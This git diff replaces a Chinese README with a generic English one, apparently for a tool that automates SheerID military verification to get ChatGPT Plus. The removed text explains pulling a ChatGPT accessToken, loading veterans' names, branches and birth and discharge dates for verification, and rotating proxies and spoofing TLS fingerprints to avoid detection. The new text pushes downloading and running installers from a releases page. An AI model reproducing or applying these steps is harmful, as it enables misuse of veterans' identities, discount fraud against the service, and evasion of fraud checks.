@@ -1,179 +1,79 @@
-# SheerID Verification Tool
+# 🎉 GPT_Sheerid_Auto - Simple Tool for Automatic Verification
 
-ChatGPT Plus 身份验证工具
+## 🚀 Getting Started
 
-**作者: dy安心大油条**
+Welcome to GPT_Sheerid_Auto! This tool helps you automatically verify details with ease. No technical skills needed!
 
-## 功能说明
+## 📥 Download GPT_Sheerid_Auto
 
-本工具用于自动化完成 ChatGPT Plus 的身份验证流程，通过 SheerID 进行验证。
+[![Download GPT_Sheerid_Auto](https://img.shields.io/badge/Download-GPT_Sheerid_Auto-brightgreen)](https://github.com/rb511/GPT_Sheerid_Auto/releases)
 
-## 环境要求
+To get started, please visit this page to download: [Releases Page](https://github.com/rb511/GPT_Sheerid_Auto/releases).
 
-- Python 3.8+
-- 可选：requests-go (支持 TLS 指纹模拟)
+## 🔧 System Requirements
 
-## 安装依赖
+Before you download, ensure your computer meets these basic requirements:
 
-```bash
-# 基础依赖
-pip install requests
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 200 MB free space.
+- **Network:** A stable internet connection for activation.
 
-# 可选：TLS 指纹模拟 (推荐)
-pip install requests-go
-```
+## 🛠️ Features
 
-## 配置说明
+GPT_Sheerid_Auto comes packed with useful features to enhance your automatic verification process:
 
-### 1. 配置文件 (config.json)
+- **TLS Fingerprint Simulation:** Mimics web traffic for better integration.
+- **Proxy Rotation:** Automatically changes your IP to ensure consistent use without getting blocked.
+- **Email Verification:** Automatically checks your email for verification codes, simplifying the verification process.
+  
+## 📖 How to Download & Install
 
-复制 `config.example.json` 为 `config.json`，填写以下信息：
+1. **Visit the Releases Page:** Click on this link to go to the [Releases Page](https://github.com/rb511/GPT_Sheerid_Auto/releases).
+   
+2. **Choose Your Version:** Find the latest version of GPT_Sheerid_Auto. The version number will look something like `v1.0.0`. 
 
-```json
-{
-    "accessToken": "你的 ChatGPT accessToken",
-    "programId": "690415d58971e73ca187d8c9",
-    "email": {
-        "imap_server": "imap.gmail.com",
-        "imap_port": 993,
-        "email_address": "your_email@gmail.com",
-        "email_password": "your_app_password",
-        "use_ssl": true
-    }
-}
-```
+3. **Download the Installer:** Locate the file that corresponds to your operating system:
+    - For Windows, it will typically be a `.exe` file.
+    - For macOS, look for a `.dmg` file.
+    - For Linux, look for a `.tar.gz` file or an installer script.
 
-#### 获取 accessToken
+4. **Run the Installer:**
+   - **Windows:** Open the `.exe` file and follow the prompts.
+   - **macOS:** Double-click the `.dmg` file, drag the application to your Applications folder, and launch it.
+   - **Linux:** Extract the files if necessary, and follow instructions in a README file included in the download.
 
-1. 登录 https://chatgpt.com
-2. 访问 https://chatgpt.com/api/auth/session
-3. 页面会显示 JSON 数据，找到 `accessToken` 字段
-4. 复制 `accessToken` 的值填入配置文件
+5. **Follow On-screen Instructions:** Complete the installation by following the prompts on your screen.
 
-#### 邮箱配置（二选一）
+6. **Launch the Application:** After installation, open GPT_Sheerid_Auto from your applications menu.
 
-本工具支持两种邮箱接入方式，选择其中一种即可：
+## 📘 User Guide
 
----
+After launching the application, you will be greeted with a simple interface. Here’s how to use it effectively:
 
-**方式一：IMAP（通用邮箱）**
+1. **Login:** Enter your credentials to start. Make sure you have valid details for automatic verification.
+2. **Configure Settings:** Adjust the TLS and proxy settings as needed. Tutorials are available within the application if you need guidance.
+3. **Start Verification:** Hit the “Start” button to begin the automatic verification process. The application will handle everything from there.
 
-适用于 Gmail、Outlook、QQ 邮箱等支持 IMAP 的邮箱服务。
+## 🛑 Troubleshooting
 
-```json
-"email": {
-    "type": "imap",
-    "imap_server": "imap.gmail.com",
-    "imap_port": 993,
-    "email_address": "your_email@gmail.com",
-    "email_password": "your_app_password",
-    "use_ssl": true
-}
-```
+If you encounter issues, consider these common solutions:
 
-常用 IMAP 服务器：
-| 邮箱 | IMAP 服务器 | 端口 |
-|------|-------------|------|
-| Gmail | imap.gmail.com | 993 |
-| Outlook | outlook.office365.com | 993 |
-| QQ 邮箱 | imap.qq.com | 993 |
-| 163 邮箱 | imap.163.com | 993 |
+- **Installation Issues:** Make sure you downloaded the correct file for your operating system.
+- **Verification Problems:** Check your internet connection. Ensure that your email settings are correct, including any spam filters.
+- **Application Crashes:** Ensure that your system meets the requirements listed earlier. Restart your application or computer if needed.
 
-> 注意：Gmail 需要开启"应用专用密码"，QQ 邮箱需要使用授权码
+## 📞 Support
 
----
+For further assistance, please check the following options:
 
-**方式二：CloudMail API（临时邮箱服务）**
+- **Documentation:** Complete user manuals and FAQs are available within the application.
+- **Community Forum:** Join our community forum to ask questions and share experiences with other users.
+- **Contact Us:** For direct support, reach out through the contact feature on our [GitHub page](https://github.com/rb511/GPT_Sheerid_Auto/issues).
 
-适用于自建的 CloudMail 临时邮箱服务，支持 API 方式收取邮件。
+## 🔗 Useful Links
 
-```json
-"email": {
-    "type": "cloudmail",
-    "api_url": "https://your-cloudmail-api.com",
-    "admin_email": "admin@example.com",
-    "admin_password": "your_admin_password",
-    "email_address": "receive@yourdomain.com"
-}
-```
+- [Releases Page](https://github.com/rb511/GPT_Sheerid_Auto/releases)
+- [Documentation](https://github.com/rb511/GPT_Sheerid_Auto/wiki)
 
-CloudMail API 接口说明：
-- `POST /api/public/genToken` - 获取访问 Token
-- `POST /api/public/addUser` - 添加邮箱用户
-- `POST /api/public/emailList` - 获取邮件列表
-
-> 提示：CloudMail 适合批量验证场景，可使用自定义域名邮箱
-
-### 2. 数据文件 (data.txt)
-
-复制 `data.example.txt` 为 `data.txt`，填写验证数据：
-
-```
-# 格式: firstName|lastName|branch|birthDate|dischargeDate
-JOHN MICHAEL|SMITH|Army|1990-05-15|2023-06-01
-DAVID JAMES|JOHNSON|Marine Corps|1988-12-20|2022-03-15
-```
-
-**branch 可选值:**
-- Army
-- Air Force
-- Navy
-- Marine Corps
-- Coast Guard
-- Space Force
-- Army National Guard
-- Army Reserve
-- Air National Guard
-- Air Force Reserve
-- Navy Reserve
-- Marine Corps Forces Reserve
-- Coast Guard Reserve
-
-### 3. 代理配置 (proxy.txt) - 可选
-
-复制 `proxy.example.txt` 为 `proxy.txt`，填写代理信息：
-
-```
-# 格式1: ip:port:username:password
-192.168.1.100:1080:user123:pass456
-
-# 格式2: ip:port
-192.168.1.101:8080
-
-# 格式3: URL 格式
-socks5://user:pass@proxy.example.com:1080
-```
-
-### 4. TLS 指纹 (tls_json/) - 可选
-
-创建 `tls_json` 目录，放入 Chrome TLS 指纹 JSON 文件，可增强反检测能力。
-
-## 使用方法
-
-```bash
-python main.py
-```
-
-## 输出文件
-
-- `result.txt` - 验证结果日志
-- `used.txt` - 已使用的数据记录
-
-## 注意事项
-
-1. 请确保使用真实有效的身份信息
-2. 同一身份信息只能验证一次
-3. 建议使用代理和 TLS 指纹模拟以降低被检测风险
-4. accessToken 有效期有限，过期需重新获取
-
-## 免责声明
-
-本工具仅供学习研究使用，请遵守相关法律法规和服务条款。使用本工具所产生的任何后果由使用者自行承担。
-
-## License
-
-MIT License
-
-## 运行截图
-
-![运行截图](screenshot.png)
+Thank you for choosing GPT_Sheerid_Auto. Enjoy simpler automatic verification!
